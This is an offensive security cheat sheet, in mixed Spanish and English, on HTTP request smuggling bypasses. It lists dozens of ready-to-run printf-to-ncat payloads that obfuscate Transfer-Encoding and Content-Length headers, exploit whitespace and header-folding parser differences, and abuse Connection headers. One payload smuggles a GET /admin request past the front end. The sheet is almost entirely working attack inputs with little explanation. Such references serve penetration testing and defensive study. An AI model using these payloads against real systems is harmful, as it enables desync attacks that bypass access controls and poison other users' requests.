---
aliases:
  - HRS Bypass
  - Header Obfuscation
  - Smuggling Evasion
tags:
  - vuln/http-smuggling
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Request Smuggling]]"
---
# HTTP Request Smuggling - Bypasses

---

## TE Obfuscation (Transfer-Encoding)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf '...\r\nTransfer-Encoding : chunked\r\n...' \| ncat target 80` (espacio antes `:`) | OWS bypass — front rejecta, back acepta (o viceversa) | RFC permits OWS, parsers difieren. |
| `printf '...\r\nTransfer-Encoding:\tchunked\r\n...' \| ncat target 80` (tab) | Tab differential | Whitespace parser. |
| `printf '...\r\nTransfer-Encoding:\x0bchunked\r\n...' \| ncat target 80` (vertical tab 0x0B) | Invisible char bypass | Edge whitespace. |
| `printf '...\r\nTransfer-Encoding:\r\n chunked\r\n...' \| ncat target 80` | Header folding (RFC 7230 prohibido pero some parsers OK) | Continuation line. |
| `printf '...\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n...' \| ncat target 80` | Doble TE — first/last differential | Parser order. |
| `printf '...\r\nTransfer-Encoding: chunked, identity\r\n...' \| ncat target 80` | Multi-value coma | RFC order matters. |
| `printf '...\r\nTransfer-Encoding: xchunked\r\n...' \| ncat target 80` | Prefix dummy — front rejecta, back ignora prefix | Variant common. |
| `printf '...\r\nTransfer-Encoding: chunkedX\r\n...' \| ncat target 80` | Trailing garbage | Some parsers strict. |
| `printf '...\r\nTransfеr-Encoding: chunked\r\n...' \| ncat target 80` (Cyrillic 'е') | Visual lookalike Unicode | Edge UTF-8. |
| `printf '...\r\nConnection: TE\r\nTE: chunked\r\nTransfer-Encoding: chunked\r\n...' \| ncat target 80` | Hop-by-hop hint + TE | Some servers solo procesan TE si Connection:TE present. |
| `printf '...\r\nTransfer-Encoding: gzip, chunked\r\n...' \| ncat target 80` | Multi-encoding strip differential | Algunos strip gzip, otros chunked. |
| Burp HTTP Request Smuggler → "TE.TE detect" → tool prueba todas las variantes | Auto-discovery TE obfuscation | Tool-driven. |
^hrs-bypass-te

---

## CL Obfuscation (Content-Length)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf '...\r\nContent-Length: 5\r\nContent-Length: 10\r\n...' \| ncat target 80` | Doble CL distinto — front/back distinto | RFC dice rejectar pero laxos OK. |
| `printf '...\r\nContent-Length: 10\r\ncontent-length: 10\r\n...' \| ncat target 80` (case mixed) | Doble CL same value, case differential | Algunos rejectan exact dup. |
| `printf '...\r\nContent-Length: 10 \r\n...' \| ncat target 80` (trailing space) | Whitespace trim varies | Strict parsers fail. |
| `printf '...\r\nContent-Length: 0xa\r\n...' \| ncat target 80` | Hex en value | Laxos parsean como 10. |
| `printf '...\r\nContent-Length: -1\r\n...' \| ncat target 80` | Negativo | Edge case fail-open. |
| `printf '...\r\nContent-Length: 0\r\n\r\nSMUGGLED' \| ncat target 80` | CL=0 con body — body queda en buffer | Potencial smuggle implícito. |
| `printf '...\r\n\r\nSMUGGLED' \| ncat target 80` (sin CL ni TE) | Default RFC body=0 — parser laxo lee siguiente line | Edge fail. |
| `printf '...\r\nContent-Length: 999999999\r\n...' \| ncat target 80` | CL gigante → timeout window | Slow smuggle. |
| `printf '...\r\nContent_Length: 10\r\n...' \| ncat target 80` (underscore) | Header name normalization differential | Some normalize, otros no. |
^hrs-bypass-cl

---

## Whitespace Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'GET  / HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` (doble espacio en method) | Method/path separator bypass | Strict parsers reject. |
| `printf 'GET\t/path HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` | Tab donde se espera space | Parser whitespace differential. |
| `printf 'GET / HTTP/1.1\nHost: target\n\n' \| ncat target 80` (bare LF, no CRLF) | Bare LF en lugar de CRLF | RFC requires CRLF. |
| `printf 'Host:\r\n target.com\r\n\r\n' \| ncat target 80` (continuation line) | LWS multi-line header (folding) | RFC 7230 obsolete pero parsers laxos. |
| `printf '...\r\nHeader:\x00 value\r\n...' \| ncat target 80` | NUL byte en header | Crash o trunca según parser. |
| `printf 'GET /\r\n\r\n' \| ncat target 80` (HTTP/0.9 implícito, sin version) | HTTP/0.9 abuse | Backend legacy. |
| `printf '...\r\nConnection: X-Custom\r\nX-Custom: value\r\n...' \| ncat target 80` | Hop-by-hop arbitrary header strip | Front strip via Connection list, back recibe. |
| `printf '...\r\nHeader: value \r\n...' \| ncat target 80` (trailing space en value) | Trailing whitespace conservation | Parsers conservan vs strip. |
^hrs-bypass-whitespace

---

## Connection: close Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` | Front cierra conn, back queda con bytes en buffer | Edge desync — back close-resistant. |
| `printf '...\r\nConnection: close, keep-alive\r\n...' \| ncat target 80` | Multi-value Connection — confusion sobre cuál respeta | Parser ambiguity. |
| `printf '...\r\nConnection: TE\r\nTE: chunked\r\n...' \| ncat target 80` | Habilitar TE explícito via Connection hint | Backend que solo respeta TE si Connection:TE. |
| `printf '...\r\nConnection: keep-alive\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n[smuggle]' \| ncat target 80` | Default H1.1 keep-alive — necesario para HRS queue funcione | Standard required. |
| Burp Repeater → "Send group → in single connection" → toggle Connection header values | Test connection behaviors | Manual exploration. |
^hrs-bypass-connection

---
